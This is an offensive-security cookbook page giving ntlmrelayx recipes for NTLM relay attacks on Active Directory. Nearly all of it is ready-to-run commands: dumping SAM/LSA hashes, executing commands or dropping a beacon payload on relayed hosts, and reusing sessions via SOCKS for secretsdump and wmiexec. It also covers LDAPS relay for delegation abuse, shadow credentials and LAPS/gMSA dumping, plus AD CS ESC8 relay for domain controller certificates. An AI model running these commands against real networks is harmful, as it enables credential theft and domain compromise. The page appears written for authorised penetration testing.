---
title: ntlmrelayx cookbook
category: AD / Relay & Coercion
order: 16
tags: [ntlmrelayx, socks, proxychains, ldap, adcs, exec, impacket]
summary: >
  A recipe list for impacket's ntlmrelayx — SOCKS session reuse, command exec,
  and the LDAP / AD CS attack modes. Pair every recipe with a trigger (Responder,
  mitm6, coercion) and a target that doesn't enforce signing/EPA.
tools: [impacket (ntlmrelayx), proxychains, netexec]
refs:
  - { label: "Impacket", url: "https://github.com/fortra/impacket" }
  - { label: "HackTricks — ntlmrelayx", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/relaying-credentials" }
---

## Targets

```sh
# single target, or a file (one host/URI per line)
ntlmrelayx.py -t smb://$target -smb2support
ntlmrelayx.py -tf relay_targets.txt -smb2support
```

## Relay to SMB — dump, exec, interactive

```sh
# dump local SAM/LSA wherever the relayed user is local admin
ntlmrelayx.py -tf relay_targets.txt -smb2support --dump-sam
# run a command / drop a payload
ntlmrelayx.py -t smb://$target -smb2support -c 'whoami /all'
ntlmrelayx.py -t smb://$target -smb2support -e /tmp/beacon.exe
# interactive SMB client (then connect to the listener it opens)
ntlmrelayx.py -t smb://$target -smb2support -i
#   -> nc 127.0.0.1 11000
```

## SOCKS — reuse the session with any tool

The killer feature: keep each relayed session open and drive it through SOCKS
with `-no-pass` (the session is already authenticated).

```sh
ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
# in the ntlmrelayx console:
#   socks         list live sessions (target / user / admin?)
```

```sh
# /etc/proxychains4.conf  ->  socks4 127.0.0.1 1080
proxychains -q secretsdump.py $domain/$user@$target -no-pass
proxychains -q smbclient.py   -no-pass $domain/$user@$target
proxychains -q mssqlclient.py -no-pass -windows-auth $domain/$user@$target
proxychains -q wmiexec.py     -no-pass $domain/$user@$target
```

## Relay to LDAP / LDAPS (needs an HTTP source — see WebDAV)

```sh
# RBCD: grant a computer you control delegation over the victim
ntlmrelayx.py -t ldaps://$dc_ip --delegate-access --escalate-user 'EVIL$'
# Shadow Credentials on the relayed principal
ntlmrelayx.py -t ldaps://$dc_ip --shadow-credentials --shadow-target $target_user
# loot LDAP while you're in
ntlmrelayx.py -t ldaps://$dc_ip --dump-laps --dump-gmsa --dump-adcs
```

## Relay to AD CS (ESC8) — cert for the victim

```sh
ntlmrelayx.py -t http://$dc_host/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
# user victim -> --template User
```

## Useful flags

```sh
# --remove-mic     drop the MIC (CVE-2019-1040, unpatched targets) to enable SMB->LDAP
# -6               listen on IPv6 (pair with mitm6)
# -wh attacker     serve a WPAD file (HTTP source for LDAP relay)
# -of loot         write captured hashes/output to files
# --no-http-server / --no-smb-server   disable a listener so Responder can own that port
```

> Order of operations: start ntlmrelayx first, then fire the trigger
> (Responder / mitm6 / coercion). The relay must be listening when the victim
> authenticates.
